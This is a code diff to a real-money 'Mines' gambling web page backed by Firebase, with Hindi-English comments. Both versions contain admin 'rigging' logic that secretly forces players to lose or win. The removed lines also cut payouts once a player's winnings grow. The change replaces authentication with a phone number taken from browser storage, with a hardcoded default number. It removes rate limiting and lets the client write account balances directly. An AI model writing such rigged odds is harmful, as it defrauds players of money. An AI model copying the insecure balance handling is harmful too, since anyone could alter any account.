@@ -16,7 +16,7 @@
         .header { display: flex; justify-content: space-between; align-items: center; background: var(--surface); padding: 15px; border-radius: 18px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); gap: 10px; }
         .balance-chip { font-weight: 800; color: var(--accent); font-size: 18px; }
         .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin: 20px 0; background: rgba(0,0,0,0.3); padding: 12px; border-radius: 15px; }
-        .slot { aspect-ratio: 1 / 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; border: 2px solid #334155; }
+        .slot { aspect-ratio: 1 / 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; border: 2px solid #334155; transition: 0.2s; }
         .slot.revealed { cursor: default; }
         .slot.diamond { background: radial-gradient(circle, #06b6d4, #083344); border-color: #22d3ee; }
         .slot.bomb { background: radial-gradient(circle, #ef4444, #7f1d1d); border-color: #f87171; }
@@ -92,15 +92,20 @@
         appId: "1:546674600784:web:4b316bb716eda5f3b7da55"
     };
 
-    // Initialize Firebase if not already initialized
     if (!firebase.apps.length) {
         firebase.initializeApp(firebaseConfig);
     }
     const db = firebase.database();
-    const auth = firebase.auth();
+    
+    // User ID manually get karein (Aapne login page me save kiya tha)
+    const userPhone = localStorage.getItem('userPhone') || '9117748052'; 
 
     let balance = 0, currentLvl = 'easy', isPlaying = false, mines = [], diamondsFound = 0, activeBet = 0, userTotalDeposit = 0;
-    const mTable = { easy: [1.2, 1.8, 2.5, 3.5, 7.0, 11.0], medium: [4.0, 7.0, 15.0], hard: [6.0, 10.0] };
+    const mTable = { 
+        easy: [1.2, 1.8, 2.5, 3.5, 4.8, 6.5, 9.0, 12.0], 
+        medium: [4.0, 8.5, 18.0, 35.0], 
+        hard: [24.0, 150.0] 
+    };
 
     function initGrid() {
         const grid = document.getElementById("gameGrid");
@@ -115,26 +120,17 @@
     }
     initGrid();
 
-    // Sahi Auth check aur Realtime Balance logic
-    auth.onAuthStateChanged(user => {
-        if(user) {
-            // User ki phone number/UID se node fetch karna
-            // Note: Aapne pehle `users/${user.uid}` use kiya tha, ensure karein 
-            // ki database mein data UID ke andar hi hai ya phone number ke.
-            db.ref(`users/${user.uid}`).on('value', snap => {
-                const data = snap.val();
-                if(data) {
-                    balance = data.balance || 0;
-                    userTotalDeposit = data.totalDeposit || 0;
-                    document.getElementById("balanceDisplay").innerText = balance.toFixed(2);
-                    window.rigData = data;
-                }
-            });
-            loadHistory(user.uid);
-        } else {
-            console.log("No user logged in");
+    // Sahi Data Path Check
+    db.ref(`users/${userPhone}`).on('value', snap => {
+        const data = snap.val();
+        if(data) {
+            balance = data.balance || 0;
+            userTotalDeposit = data.totalDeposit || 0;
+            document.getElementById("balanceDisplay").innerText = balance.toFixed(2);
+            window.rigData = data; // For forceWin/Loss
         }
     });
+    loadHistory(userPhone);
 
     window.changeLvl = (l) => {
         if(isPlaying) return;
@@ -144,22 +140,18 @@
     };
 
     window.startGame = async () => {
-        const user = auth.currentUser;
-        if(!user) return alert("Login First!");
-        
-        if (window.lastBetTime && Date.now() - window.lastBetTime < 2000) return alert("Please wait...");
-
         activeBet = parseFloat(document.getElementById("betInput").value);
         if(isNaN(activeBet) || activeBet < 10) return alert("Min bet ₹10");
         if(activeBet > balance) return alert("Low Balance!");
 
-        window.lastBetTime = Date.now();
         isPlaying = true; 
         diamondsFound = 0; 
         mines = [];
         
-        // Deduction
-        await db.ref(`users/${user.uid}`).update({ balance: firebase.database.ServerValue.increment(-activeBet) });
+        // Deduction - V8 Style
+        db.ref(`users/${userPhone}`).update({ 
+            balance: balance - activeBet 
+        });
 
         let mCount = (currentLvl === 'easy') ? 3 : (currentLvl === 'medium' ? 10 : 24);
         while(mines.length < mCount) {
@@ -178,24 +170,20 @@
         document.getElementById("profitText").innerText = "₹0.00";
     };
 
-    window.handleMove = async (idx) => {
+    window.handleMove = (idx) => {
         if(!isPlaying) return;
         const el = document.getElementById("s-" + idx);
         if(el.classList.contains('revealed')) return;
 
+        // Admin Rigging Logic
         let forceLoss = window.rigData?.forceLoss || false;
         let forceWin = window.rigData?.forceWin || false;
-        
-        // PROFIT RIGGING
-        let targetProfit = userTotalDeposit * 2;
-        let slowDown = (balance > targetProfit) && (Math.random() < 0.5);
 
-        if((forceLoss || slowDown) && !mines.includes(idx)) { 
-            if(mines.length > 0) mines.pop(); 
-            mines.push(idx); 
+        if(forceLoss && !mines.includes(idx)) {
+            mines.pop(); mines.push(idx);
         }
-        if(forceWin && mines.includes(idx)) { 
-            mines = mines.filter(m => m !== idx); 
+        if(forceWin && mines.includes(idx)) {
+            mines = mines.filter(m => m !== idx);
         }
 
         if(mines.includes(idx)) {
@@ -217,18 +205,18 @@
         document.getElementById("cashBtn").innerText = `CASHOUT ₹${(activeBet * mult).toFixed(2)}`;
     }
 
-    window.cashout = async () => {
+    window.cashout = () => {
         if(!isPlaying || diamondsFound === 0) return;
         const mult = mTable[currentLvl][diamondsFound-1] || 1;
-        const win = activeBet * mult;
+        const winAmount = activeBet * mult;
         
-        await db.ref(`users/${auth.currentUser.uid}`).update({ 
-            balance: firebase.database.ServerValue.increment(win) 
+        db.ref(`users/${userPhone}`).update({ 
+            balance: balance + winAmount 
         });
         
-        saveHistory(activeBet, win, "Win");
+        saveHistory(activeBet, winAmount, "Win");
         finishGame(true);
-        showModal("WINNER!", `Won: ₹${win.toFixed(2)}`, "🏆");
+        showModal("WINNER!", `Won: ₹${winAmount.toFixed(2)}`, "🏆");
     };
 
     function finishGame(won) {
@@ -237,7 +225,7 @@
             const s = document.getElementById("s-" + i);
             if(mines.includes(i)) { 
                 s.innerText = "💣"; 
-                s.classList.add(won ? "revealed-bomb" : "bomb"); 
+                s.classList.add("bomb"); 
             }
         }
         setTimeout(() => {
@@ -246,11 +234,10 @@
         }, 1500);
     }
 
-    async function saveHistory(bet, win, status) {
-        if(!auth.currentUser) return;
+    function saveHistory(bet, win, status) {
         const time = new Date().toLocaleTimeString();
-        db.ref(`users/${auth.currentUser.uid}/minesHistory`).push({ 
-            bet, win, status, time, multiplier: (win/bet || 0).toFixed(2) 
+        db.ref(`users/${userPhone}/minesHistory`).push({ 
+            bet, win, status, time 
         });
     }
 
@@ -262,7 +249,7 @@
             if(!data) { list.innerHTML = "<div style='text-align:center; padding:10px;'>No history</div>"; return; }
             Object.values(data).reverse().forEach(h => {
                 const color = h.status === "Win" ? "var(--success)" : "var(--danger)";
-                list.innerHTML += `<div class="hist-item"><span>${h.time}</span><span style="color:${color}; font-weight:bold;">${h.status === "Win" ? "+" : "-"}₹${h.status === "Win" ? h.win : h.bet}</span></div>`;
+                list.innerHTML += `<div class="hist-item"><span>${h.time}</span><span style="color:${color}; font-weight:bold;">${h.status === "Win" ? "+" : "-"}₹${h.status === "Win" ? h.win.toFixed(2) : h.bet}</span></div>`;
             });
         });
     }
